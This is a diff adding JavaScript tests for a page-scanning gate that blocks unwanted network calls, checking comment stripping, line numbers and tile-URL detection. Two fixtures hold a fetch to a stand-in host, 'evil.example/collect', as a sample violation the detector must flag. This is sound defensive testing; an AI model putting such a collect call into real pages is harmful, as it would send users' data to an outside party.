@@ -38,3 +38,54 @@ test("throws when there is more than one core block", () => {
     /more than one/,
   );
 });
+
+// The network gate strips comments before scanning, because it is about what
+// the page DOES. An earlier version matched the bare word "plausible" and fired
+// on a comment explaining the network policy — a gate that cries wolf on prose
+// is one people learn to ignore, which is worse than not having one.
+test("comment stripping blanks comments but preserves line numbers", async () => {
+  const { stripComments } = await import("../scripts2/check-network.js");
+  const source = [
+    "const a = 1;",
+    "/* a comment mentioning plausible and analytics",
+    "   over several lines */",
+    "const b = 2; // trailing mention of posthog",
+    "<!-- an html comment about mapbox -->",
+    "const c = 3;",
+  ].join("\n");
+  const out = stripComments(source);
+
+  assert.equal(out.split("\n").length, 6, "line count must survive");
+  assert.match(out.split("\n")[0], /const a = 1;/);
+  assert.doesNotMatch(out, /plausible/);
+  assert.doesNotMatch(out, /posthog/);
+  assert.doesNotMatch(out, /mapbox/);
+  assert.match(out.split("\n")[5], /const c = 3;/);
+});
+
+test("stripping does not eat a URL that is real code", async () => {
+  const { stripComments } = await import("../scripts2/check-network.js");
+  const kept = stripComments('fetch("https://evil.example/collect");');
+  assert.match(kept, /evil\.example/, "a real call must still be visible to the gate");
+});
+
+// The gate must still see a real call — blanking comments must not blank code.
+test("the gate catches a genuine violation and reports its line", async () => {
+  const { scan } = await import("../scripts2/check-network.js");
+  const html = [
+    "<script>",
+    "  // a comment about mapbox and plausible",
+    '  fetch("https://evil.example/collect");',
+    "</script>",
+  ].join("\n");
+  const found = scan(html);
+  assert.equal(found.length, 1, `expected exactly one violation, got ${JSON.stringify(found)}`);
+  assert.equal(found[0].line, 3, "line number must survive comment blanking");
+  assert.match(found[0].why, /evil\.example/);
+});
+
+test("the gate refuses a tile URL template", async () => {
+  const { scan } = await import("../scripts2/check-network.js");
+  const found = scan('const url = "https://cdn.jsdelivr.net/{z}/{x}/{y}.png";');
+  assert.ok(found.some((v) => /tile/i.test(v.why)), "a tile template must be caught even on an allowed host");
+});
